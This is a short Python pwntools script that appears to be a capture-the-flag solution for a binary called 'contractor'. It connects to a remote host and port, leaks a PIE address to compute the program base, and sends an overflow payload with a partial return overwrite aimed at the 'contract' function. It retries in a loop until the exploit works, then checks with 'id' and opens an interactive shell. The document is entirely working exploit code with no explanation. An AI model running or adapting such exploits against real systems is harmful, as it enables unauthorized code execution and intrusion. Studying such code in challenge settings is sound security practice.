from pwn import *

context.binary = binary = ELF('./contractor',checksec=False)

while True:
	p = remote('94.237.55.186',45749)

	p.sendlineafter(b'> ', b'name')
	p.sendlineafter(b'> ', cyclic(255))
	p.sendlineafter(b'> ', str(0xffffffffffffffff).encode())
	p.sendlineafter(b'> ', b'a'*0x10)

	p.recvuntil(b'a'*0x10)
	pie_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
	binary.address = pie_leak - 0x1b50
	info(f'pie leak: {hex(pie_leak)}')
	info(f'pie base: {hex(binary.address)}')

	win = binary.symbols.contract

	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b': ', b'B'*0x18+p64(0)+b'\xcf'+p64(win))

	try:
		p.sendlineafter(b'> ', b'yes',timeout=1)
		p.sendlineafter(b'> ', b'1',timeout=1)
		p.sendlineafter(b': ', b'name',timeout=1)
	except:
		p.recvrepeat(1)
		continue

	p.sendline(b'id')
	if b'ctf' in p.recvrepeat(1):
		print('*** SHELL ***')
		p.interactive()
		p.close()
		exit()
